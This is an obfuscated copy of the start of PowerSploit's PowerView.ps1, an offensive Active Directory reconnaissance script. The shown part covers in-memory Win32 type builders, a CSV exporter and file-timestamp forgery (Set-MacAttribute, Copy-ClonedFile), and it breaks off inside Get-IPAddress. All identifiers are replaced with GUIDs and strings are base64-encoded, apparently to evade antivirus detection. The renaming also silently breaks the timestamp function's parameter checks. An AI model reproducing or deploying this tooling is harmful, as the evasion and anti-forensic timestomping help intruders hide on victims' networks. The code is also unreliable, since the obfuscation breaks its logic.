<#

    PowerSploit File: PowerView.ps1
    Author: Will Schroeder (@harmj0y)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

#>

########################################################
#
# PSReflect code for Windows API access
# Author: @mattifestation
#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
#
########################################################

function New-InMemoryModule
{
<#
    .SYNOPSIS

        Creates an in-memory assembly and module

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        When defining custom enums, structs, and unmanaged functions, it is
        necessary to associate to an assembly module. This helper function
        creates an in-memory module that can be passed to the 'enum',
        'struct', and Add-Win32Type functions.

    .PARAMETER ModuleName

        Specifies the desired name for the in-memory assembly and module. If
        ModuleName is not provided, it will default to a GUID.

    .EXAMPLE

        $Module = New-InMemoryModule -ModuleName Win32
#>

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${b4b7d1605e134cd4a82daa1d993f1de9} = [Guid]::NewGuid().ToString()
    )
    ${6e5f9163de4c40d29790057b7dad127a} = [AppDomain]::CurrentDomain.GetAssemblies()
    ForEach ($Assembly in ${6e5f9163de4c40d29790057b7dad127a}) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq ${b4b7d1605e134cd4a82daa1d993f1de9})) {
            return $Assembly
        }
    }
    ${aa8d14d2beb447edaf8d4a57c7082bfc} = New-Object Reflection.AssemblyName(${b4b7d1605e134cd4a82daa1d993f1de9})
    ${afa30c601e734738b32424a6234484e4} = [AppDomain]::CurrentDomain
    ${5bf753cdbd964352a622f1cfe7401368} = ${afa30c601e734738b32424a6234484e4}.DefineDynamicAssembly(${aa8d14d2beb447edaf8d4a57c7082bfc}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4A'))))
    ${508ee3777a554fcd95b5e6db7032e570} = ${5bf753cdbd964352a622f1cfe7401368}.DefineDynamicModule(${b4b7d1605e134cd4a82daa1d993f1de9}, $False)
    return ${508ee3777a554fcd95b5e6db7032e570}
}
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        ${e432ef5d52494ed2a4b91ae52e7ab10a},
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        ${e1c3a8ed9bf4431e9cdc1bfc7ad23542},
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        ${da062846c91a4f20a4782a317284670b},
        [Parameter(Position = 3)]
        [Type[]]
        ${e58211565bc940c5b1723ea46cb15aa0},
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${a2fb3d55e54945f0b3f4e1269e530831},
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        ${a8e3fec00c3f49de93543554d9bd0a81},
        [Switch]
        ${dc4526cbc57b48f59dec432784d5ffa1}
    )
    ${d90960fc83614a2fb42f43ab6aac95a1} = @{
        DllName = ${e432ef5d52494ed2a4b91ae52e7ab10a}
        FunctionName = ${e1c3a8ed9bf4431e9cdc1bfc7ad23542}
        ReturnType = ${da062846c91a4f20a4782a317284670b}
    }
    if (${e58211565bc940c5b1723ea46cb15aa0}) { ${d90960fc83614a2fb42f43ab6aac95a1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAYQBtAGUAdABlAHIAVAB5AHAAZQBzAA==')))] = ${e58211565bc940c5b1723ea46cb15aa0} }
    if (${a2fb3d55e54945f0b3f4e1269e530831}) { ${d90960fc83614a2fb42f43ab6aac95a1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUAQwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA==')))] = ${a2fb3d55e54945f0b3f4e1269e530831} }
    if (${a8e3fec00c3f49de93543554d9bd0a81}) { ${d90960fc83614a2fb42f43ab6aac95a1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBzAGUAdAA=')))] = ${a8e3fec00c3f49de93543554d9bd0a81} }
    if (${dc4526cbc57b48f59dec432784d5ffa1}) { ${d90960fc83614a2fb42f43ab6aac95a1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA')))] = ${dc4526cbc57b48f59dec432784d5ffa1} }
    New-Object PSObject -Property ${d90960fc83614a2fb42f43ab6aac95a1}
}
function Add-Win32Type
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        ${e432ef5d52494ed2a4b91ae52e7ab10a},
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        ${e1c3a8ed9bf4431e9cdc1bfc7ad23542},
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        ${da062846c91a4f20a4782a317284670b},
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        ${e58211565bc940c5b1723ea46cb15aa0},
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        ${a2fb3d55e54945f0b3f4e1269e530831} = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        ${a8e3fec00c3f49de93543554d9bd0a81} = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        ${dc4526cbc57b48f59dec432784d5ffa1},
        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        ${d9d1a8ab5b424a43b118c5f77b0d1a94},
        [ValidateNotNull()]
        [String]
        ${eafefacad26c4f05a016568789ff5c9f} = ''
    )
    BEGIN
    {
        ${e3bd444975934fd1b86f107197afe9a5} = @{}
    }
    PROCESS
    {
        if (${d9d1a8ab5b424a43b118c5f77b0d1a94} -is [Reflection.Assembly])
        {
            if (${eafefacad26c4f05a016568789ff5c9f})
            {
                ${e3bd444975934fd1b86f107197afe9a5}[${e432ef5d52494ed2a4b91ae52e7ab10a}] = ${d9d1a8ab5b424a43b118c5f77b0d1a94}.GetType("${eafefacad26c4f05a016568789ff5c9f}.${e432ef5d52494ed2a4b91ae52e7ab10a}")
            }
            else
            {
                ${e3bd444975934fd1b86f107197afe9a5}[${e432ef5d52494ed2a4b91ae52e7ab10a}] = ${d9d1a8ab5b424a43b118c5f77b0d1a94}.GetType(${e432ef5d52494ed2a4b91ae52e7ab10a})
            }
        }
        else
        {
            if (!${e3bd444975934fd1b86f107197afe9a5}.ContainsKey(${e432ef5d52494ed2a4b91ae52e7ab10a}))
            {
                if (${eafefacad26c4f05a016568789ff5c9f})
                {
                    ${e3bd444975934fd1b86f107197afe9a5}[${e432ef5d52494ed2a4b91ae52e7ab10a}] = ${d9d1a8ab5b424a43b118c5f77b0d1a94}.DefineType("${eafefacad26c4f05a016568789ff5c9f}.${e432ef5d52494ed2a4b91ae52e7ab10a}", $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
                }
                else
                {
                    ${e3bd444975934fd1b86f107197afe9a5}[${e432ef5d52494ed2a4b91ae52e7ab10a}] = ${d9d1a8ab5b424a43b118c5f77b0d1a94}.DefineType(${e432ef5d52494ed2a4b91ae52e7ab10a}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
                }
            }
            ${b2abe530830445cbb72b697b996bcc74} = ${e3bd444975934fd1b86f107197afe9a5}[${e432ef5d52494ed2a4b91ae52e7ab10a}].DefineMethod(
                ${e1c3a8ed9bf4431e9cdc1bfc7ad23542},
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAsAFAAaQBuAHYAbwBrAGUASQBtAHAAbAA='))),
                ${da062846c91a4f20a4782a317284670b},
                ${e58211565bc940c5b1723ea46cb15aa0})
            ${df57982c23a24d73a2eb69bf47d8ac30} = 1
            ForEach($Parameter in ${e58211565bc940c5b1723ea46cb15aa0})
            {
                if ($Parameter.IsByRef)
                {
                    [void] ${b2abe530830445cbb72b697b996bcc74}.DefineParameter(${df57982c23a24d73a2eb69bf47d8ac30}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQA'))), $Null)
                }
                ${df57982c23a24d73a2eb69bf47d8ac30}++
            }
            ${7f82839ad90242c5a4fc39f5b3fe27ce} = [Runtime.InteropServices.DllImportAttribute]
            ${ef0fcff851b34c83bcb7dec139192b4c} = ${7f82839ad90242c5a4fc39f5b3fe27ce}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA'))))
            ${73bcea6ba25b499aa66174febb56ecd9} = ${7f82839ad90242c5a4fc39f5b3fe27ce}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA=='))))
            ${0fe585ea182e45a495b25505cc508fa6} = ${7f82839ad90242c5a4fc39f5b3fe27ce}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBTAGUAdAA='))))
            if (${dc4526cbc57b48f59dec432784d5ffa1}) { ${e4b03a080864464093bc51afd45c7d14} = $True } else { ${e4b03a080864464093bc51afd45c7d14} = $False }
            ${f89f3439e3df42098aea3df2abc16715} = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            ${726ee318ccfa4cb89057ce331b996ad4} = New-Object Reflection.Emit.CustomAttributeBuilder(${f89f3439e3df42098aea3df2abc16715},
                ${e432ef5d52494ed2a4b91ae52e7ab10a}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${ef0fcff851b34c83bcb7dec139192b4c}, ${73bcea6ba25b499aa66174febb56ecd9}, ${0fe585ea182e45a495b25505cc508fa6}),
                [Object[]] @(${e4b03a080864464093bc51afd45c7d14}, ([Runtime.InteropServices.CallingConvention] ${a2fb3d55e54945f0b3f4e1269e530831}), ([Runtime.InteropServices.CharSet] ${a8e3fec00c3f49de93543554d9bd0a81})))
            ${b2abe530830445cbb72b697b996bcc74}.SetCustomAttribute(${726ee318ccfa4cb89057ce331b996ad4})
        }
    }
    END
    {
        if (${d9d1a8ab5b424a43b118c5f77b0d1a94} -is [Reflection.Assembly])
        {
            return ${e3bd444975934fd1b86f107197afe9a5}
        }
        ${e02f5e14c5f34eeba60d4633653eeb27} = @{}
        ForEach (${5d6afadd83614764a6d3f69fb67ac9ee} in ${e3bd444975934fd1b86f107197afe9a5}.Keys)
        {
            ${cbe2d96c69704ba8a6cfacc690b4a409} = ${e3bd444975934fd1b86f107197afe9a5}[${5d6afadd83614764a6d3f69fb67ac9ee}].CreateType()
            ${e02f5e14c5f34eeba60d4633653eeb27}[${5d6afadd83614764a6d3f69fb67ac9ee}] = ${cbe2d96c69704ba8a6cfacc690b4a409}
        }
        return ${e02f5e14c5f34eeba60d4633653eeb27}
    }
}
function psenum
{
    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        ${d9d1a8ab5b424a43b118c5f77b0d1a94},
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${d9f2e8a808c9474fb43bde1847037703},
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        ${cbe2d96c69704ba8a6cfacc690b4a409},
        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${ebe1719d9d114e3883b7fbc056631d37},
        [Switch]
        ${a66d9408b2cc4452b48b24dc0e28db8b}
    )
    if (${d9d1a8ab5b424a43b118c5f77b0d1a94} -is [Reflection.Assembly])
    {
        return (${d9d1a8ab5b424a43b118c5f77b0d1a94}.GetType(${d9f2e8a808c9474fb43bde1847037703}))
    }
    ${44553d1fbd3a4cdfb5238c0bf3b1753b} = ${cbe2d96c69704ba8a6cfacc690b4a409} -as [Type]
    ${1164f879da004f54bdf7798b599f3bde} = ${d9d1a8ab5b424a43b118c5f77b0d1a94}.DefineEnum(${d9f2e8a808c9474fb43bde1847037703}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), ${44553d1fbd3a4cdfb5238c0bf3b1753b})
    if (${a66d9408b2cc4452b48b24dc0e28db8b})
    {
        ${4be9927731964610ae4fd48845fc06ec} = [FlagsAttribute].GetConstructor(@())
        ${5e971af6606746be924a211e8ae8a8fb} = New-Object Reflection.Emit.CustomAttributeBuilder(${4be9927731964610ae4fd48845fc06ec}, @())
        ${1164f879da004f54bdf7798b599f3bde}.SetCustomAttribute(${5e971af6606746be924a211e8ae8a8fb})
    }
    ForEach (${5d6afadd83614764a6d3f69fb67ac9ee} in ${ebe1719d9d114e3883b7fbc056631d37}.Keys)
    {
        $Null = ${1164f879da004f54bdf7798b599f3bde}.DefineLiteral(${5d6afadd83614764a6d3f69fb67ac9ee}, ${ebe1719d9d114e3883b7fbc056631d37}[${5d6afadd83614764a6d3f69fb67ac9ee}] -as ${44553d1fbd3a4cdfb5238c0bf3b1753b})
    }
    ${1164f879da004f54bdf7798b599f3bde}.CreateType()
}
function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        ${cf1a0407474349e18d82bdd524c16dfb},
        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        ${cbe2d96c69704ba8a6cfacc690b4a409},
        [Parameter(Position = 2)]
        [UInt16]
        ${d0da59b7ae0a4835a7cd2c7ff056c201},
        [Object[]]
        ${c187c8c390a644ce9fc595b967c22e37}
    )
    @{
        Position = ${cf1a0407474349e18d82bdd524c16dfb}
        Type = ${cbe2d96c69704ba8a6cfacc690b4a409} -as [Type]
        Offset = ${d0da59b7ae0a4835a7cd2c7ff056c201}
        MarshalAs = ${c187c8c390a644ce9fc595b967c22e37}
    }
}
function struct
{
    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        ${d9d1a8ab5b424a43b118c5f77b0d1a94},
        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${d9f2e8a808c9474fb43bde1847037703},
        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${be6d4ddca1d44750a765b69f66c4583d},
        [Reflection.Emit.PackingSize]
        ${a2e578431dfa4d2da9f9f30d7c576ec7} = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        ${e0f960d9aee14dc3819711f704d3b9f1}
    )
    if (${d9d1a8ab5b424a43b118c5f77b0d1a94} -is [Reflection.Assembly])
    {
        return (${d9d1a8ab5b424a43b118c5f77b0d1a94}.GetType(${d9f2e8a808c9474fb43bde1847037703}))
    }
    [Reflection.TypeAttributes] ${4096c91d6ee74eb3b2c06c705cb32a14} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAHMAaQBDAGwAYQBzAHMALAANAAoAIAAgACAAIAAgACAAIAAgAEMAbABhAHMAcwAsAA0ACgAgACAAIAAgACAAIAAgACAAUAB1AGIAbABpAGMALAANAAoAIAAgACAAIAAgACAAIAAgAFMAZQBhAGwAZQBkACwADQAKACAAIAAgACAAIAAgACAAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    if (${e0f960d9aee14dc3819711f704d3b9f1})
    {
        ${4096c91d6ee74eb3b2c06c705cb32a14} = ${4096c91d6ee74eb3b2c06c705cb32a14} -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        ${4096c91d6ee74eb3b2c06c705cb32a14} = ${4096c91d6ee74eb3b2c06c705cb32a14} -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    ${e795cb2458034ed2b932e7be6a04e4bd} = ${d9d1a8ab5b424a43b118c5f77b0d1a94}.DefineType(${d9f2e8a808c9474fb43bde1847037703}, ${4096c91d6ee74eb3b2c06c705cb32a14}, [ValueType], ${a2e578431dfa4d2da9f9f30d7c576ec7})
    ${c8e6128ccf9a4c669271240c5d278280} = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    ${ade557a4631a4fb1b0e6eed00544ce8d} = @([Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
    ${e8830d9971e449ff973fcddc27829990} = New-Object Hashtable[](${be6d4ddca1d44750a765b69f66c4583d}.Count)
    ForEach ($Field in ${be6d4ddca1d44750a765b69f66c4583d}.Keys)
    {
        ${7fa129629b044e1fbb306f4e8521ac0a} = ${be6d4ddca1d44750a765b69f66c4583d}[$Field][$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHMAaQB0AGkAbwBuAA==')))]
        ${e8830d9971e449ff973fcddc27829990}[${7fa129629b044e1fbb306f4e8521ac0a}] = @{FieldName = $Field; Properties = ${be6d4ddca1d44750a765b69f66c4583d}[$Field]}
    }
    ForEach ($Field in ${e8830d9971e449ff973fcddc27829990})
    {
        ${d4169d5d9b4047b084dedbd494d51677} = $Field[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGUAbABkAE4AYQBtAGUA')))]
        ${76a084082fc64852bcb1322d0b8f6027} = $Field[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
        ${d0da59b7ae0a4835a7cd2c7ff056c201} = ${76a084082fc64852bcb1322d0b8f6027}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA')))]
        ${cbe2d96c69704ba8a6cfacc690b4a409} = ${76a084082fc64852bcb1322d0b8f6027}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAB5AHAAZQA=')))]
        ${c187c8c390a644ce9fc595b967c22e37} = ${76a084082fc64852bcb1322d0b8f6027}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHIAcwBoAGEAbABBAHMA')))]
        ${05fb6533ef98430f89ffa2629c92d11a} = ${e795cb2458034ed2b932e7be6a04e4bd}.DefineField(${d4169d5d9b4047b084dedbd494d51677}, ${cbe2d96c69704ba8a6cfacc690b4a409}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        if (${c187c8c390a644ce9fc595b967c22e37})
        {
            ${33767a28fb4c47048ea18f75b695c770} = ${c187c8c390a644ce9fc595b967c22e37}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${c187c8c390a644ce9fc595b967c22e37}[1])
            {
                ${681564ba6dde4fc7a28de8f3afae8ffe} = ${c187c8c390a644ce9fc595b967c22e37}[1]
                ${58d234230ed841afa5e668b1842a5ec5} = New-Object Reflection.Emit.CustomAttributeBuilder(${c8e6128ccf9a4c669271240c5d278280},
                    ${33767a28fb4c47048ea18f75b695c770}, ${ade557a4631a4fb1b0e6eed00544ce8d}, @(${681564ba6dde4fc7a28de8f3afae8ffe}))
            }
            else
            {
                ${58d234230ed841afa5e668b1842a5ec5} = New-Object Reflection.Emit.CustomAttributeBuilder(${c8e6128ccf9a4c669271240c5d278280}, [Object[]] @(${33767a28fb4c47048ea18f75b695c770}))
            }
            ${05fb6533ef98430f89ffa2629c92d11a}.SetCustomAttribute(${58d234230ed841afa5e668b1842a5ec5})
        }
        if (${e0f960d9aee14dc3819711f704d3b9f1}) { ${05fb6533ef98430f89ffa2629c92d11a}.SetOffset(${d0da59b7ae0a4835a7cd2c7ff056c201}) }
    }
    ${db8ea94b0c524ea9a69a818b19c4f697} = ${e795cb2458034ed2b932e7be6a04e4bd}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwBpAHoAZQA='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
        [Int],
        [Type[]] @())
    ${730a3ac630ab490188f2c3087f2eddad} = ${db8ea94b0c524ea9a69a818b19c4f697}.GetILGenerator()
    ${730a3ac630ab490188f2c3087f2eddad}.Emit([Reflection.Emit.OpCodes]::Ldtoken, ${e795cb2458034ed2b932e7be6a04e4bd})
    ${730a3ac630ab490188f2c3087f2eddad}.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVAB5AHAAZQBGAHIAbwBtAEgAYQBuAGQAbABlAA==')))))
    ${730a3ac630ab490188f2c3087f2eddad}.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYA'))), [Type[]] @([Type])))
    ${730a3ac630ab490188f2c3087f2eddad}.Emit([Reflection.Emit.OpCodes]::Ret)
    ${f87861036ee5453197dfc9ef88bf73d3} = ${e795cb2458034ed2b932e7be6a04e4bd}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAF8ASQBtAHAAbABpAGMAaQB0AA=='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQBTAGMAbwBwAGUALAAgAFAAdQBiAGwAaQBjACwAIABTAHQAYQB0AGkAYwAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFMAcABlAGMAaQBhAGwATgBhAG0AZQA='))),
        ${e795cb2458034ed2b932e7be6a04e4bd},
        [Type[]] @([IntPtr]))
    ${017d3b3b5d0243219feb428a28646e15} = ${f87861036ee5453197dfc9ef88bf73d3}.GetILGenerator()
    ${017d3b3b5d0243219feb428a28646e15}.Emit([Reflection.Emit.OpCodes]::Nop)
    ${017d3b3b5d0243219feb428a28646e15}.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    ${017d3b3b5d0243219feb428a28646e15}.Emit([Reflection.Emit.OpCodes]::Ldtoken, ${e795cb2458034ed2b932e7be6a04e4bd})
    ${017d3b3b5d0243219feb428a28646e15}.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVAB5AHAAZQBGAHIAbwBtAEgAYQBuAGQAbABlAA==')))))
    ${017d3b3b5d0243219feb428a28646e15}.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB0AHIAVABvAFMAdAByAHUAYwB0AHUAcgBlAA=='))), [Type[]] @([IntPtr], [Type])))
    ${017d3b3b5d0243219feb428a28646e15}.Emit([Reflection.Emit.OpCodes]::Unbox_Any, ${e795cb2458034ed2b932e7be6a04e4bd})
    ${017d3b3b5d0243219feb428a28646e15}.Emit([Reflection.Emit.OpCodes]::Ret)
    ${e795cb2458034ed2b932e7be6a04e4bd}.CreateType()
}
function Export-PowerViewCSV {
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True,
        ValueFromPipelineByPropertyName=$True)]
        [System.Management.Automation.PSObject]
        ${b67942bb466d4bb2ae35b61842d8002f},
        [Parameter(Mandatory=$True, Position=0)]
        [Alias('PSPath')]
        [String]
        ${a3653a86a8bf4a758cfe5d1942c0bcde}
    )
    process {
        ${903c80e254e1407eaa7feb6e1be27ab4} = ${b67942bb466d4bb2ae35b61842d8002f} | ConvertTo-Csv -NoTypeInformation
        ${e6904617cab0462da4d620b2a835fa70} = New-Object System.Threading.Mutex $False,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBTAFYATQB1AHQAZQB4AA==')));
        $Null = ${e6904617cab0462da4d620b2a835fa70}.WaitOne()
        if (Test-Path -Path ${a3653a86a8bf4a758cfe5d1942c0bcde}) {
            ${903c80e254e1407eaa7feb6e1be27ab4} | Foreach-Object {${44aa0231d526434786bd6bbb976ad17c}=$True}{if (${44aa0231d526434786bd6bbb976ad17c}) {${44aa0231d526434786bd6bbb976ad17c}=$False} else {$_}} | Out-File -Encoding $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAEMASQBJAA=='))) -Append -FilePath ${a3653a86a8bf4a758cfe5d1942c0bcde}
        }
        else {
            ${903c80e254e1407eaa7feb6e1be27ab4} | Out-File -Encoding $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAEMASQBJAA=='))) -Append -FilePath ${a3653a86a8bf4a758cfe5d1942c0bcde}
        }
        ${e6904617cab0462da4d620b2a835fa70}.ReleaseMutex()
    }
}
function Set-MacAttribute {
    [CmdletBinding(DefaultParameterSetName = 'Touch')]
    Param (
        [Parameter(Position = 1,Mandatory = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        ${c2d0346f3c5149d2996b8185fb799893},
        [Parameter(ParameterSetName = 'Touch')]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        ${bbe0368d277a48ea8cc2ea9a420e2221},
        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        ${a66228d4cdbb458396462063f093e9e7},
        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        ${a0fc0d35a3ef486ab4c94d2a2c53e6d3},
        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        ${cbeebcbb28aa4440b574e0e9fa04d7a0},
        [Parameter(ParameterSetName = 'All')]
        [DateTime]
        ${b5acf01e5ce74eb69ecbeb799e2aea92}
    )
    function Get-MacAttribute {
        param(${b0926d20f1174caa905a059163f444ed})
        if (!(Test-Path -Path ${b0926d20f1174caa905a059163f444ed})) {Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQAgAE4AbwB0ACAARgBvAHUAbgBkAA==')))}
        ${4d456ccec09c41198677e231a691d574} = (gi ${b0926d20f1174caa905a059163f444ed})
        ${d4450b926309498f8c134809102610ae} = @{'Modified' = (${4d456ccec09c41198677e231a691d574}.LastWriteTime);
                              'Accessed' = (${4d456ccec09c41198677e231a691d574}.LastAccessTime);
                              'Created' = (${4d456ccec09c41198677e231a691d574}.CreationTime)};
        ${ac0924d35e404d61a18ba85b96af5f1b} = New-Object -TypeName PSObject -Property ${d4450b926309498f8c134809102610ae}
        Return ${ac0924d35e404d61a18ba85b96af5f1b}
    }
    ${4d456ccec09c41198677e231a691d574} = (gi -Path ${c2d0346f3c5149d2996b8185fb799893})
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwATQBhAGMAQQB0AHQAcgBpAGIAdQB0AGUAcwA=')))]) {
        ${a66228d4cdbb458396462063f093e9e7} = ${b5acf01e5ce74eb69ecbeb799e2aea92}
        ${a0fc0d35a3ef486ab4c94d2a2c53e6d3} = ${b5acf01e5ce74eb69ecbeb799e2aea92}
        ${cbeebcbb28aa4440b574e0e9fa04d7a0} = ${b5acf01e5ce74eb69ecbeb799e2aea92}
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBsAGQARgBpAGwAZQBQAGEAdABoAA==')))]) {
        ${f8890795c1ac4a1fae47c2edb2c7bd18} = (Get-MacAttribute ${bbe0368d277a48ea8cc2ea9a420e2221})
        ${a66228d4cdbb458396462063f093e9e7} = ${f8890795c1ac4a1fae47c2edb2c7bd18}.Modified
        ${a0fc0d35a3ef486ab4c94d2a2c53e6d3} = ${f8890795c1ac4a1fae47c2edb2c7bd18}.Accessed
        ${cbeebcbb28aa4440b574e0e9fa04d7a0} = ${f8890795c1ac4a1fae47c2edb2c7bd18}.Created
    }
    if (${a66228d4cdbb458396462063f093e9e7}) {${4d456ccec09c41198677e231a691d574}.LastWriteTime = ${a66228d4cdbb458396462063f093e9e7}}
    if (${a0fc0d35a3ef486ab4c94d2a2c53e6d3}) {${4d456ccec09c41198677e231a691d574}.LastAccessTime = ${a0fc0d35a3ef486ab4c94d2a2c53e6d3}}
    if (${cbeebcbb28aa4440b574e0e9fa04d7a0}) {${4d456ccec09c41198677e231a691d574}.CreationTime = ${cbeebcbb28aa4440b574e0e9fa04d7a0}}
    Return (Get-MacAttribute ${c2d0346f3c5149d2996b8185fb799893})
}
function Copy-ClonedFile {
    param(
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        ${d8f5ef9192d34bd186257390321fc8b6},
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        ${d5fcb7bd24f4428989a16946cd470554}
    )
    Set-MacAttribute -c2d0346f3c5149d2996b8185fb799893 ${d8f5ef9192d34bd186257390321fc8b6} -bbe0368d277a48ea8cc2ea9a420e2221 ${d5fcb7bd24f4428989a16946cd470554}
    cp -Path ${d8f5ef9192d34bd186257390321fc8b6} -Destination ${d5fcb7bd24f4428989a16946cd470554}
}
function Get-IPAddress {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        ${c096522c7bbe4c7aaadf99843e3b09fb} = ''
    )
    process {
        try {
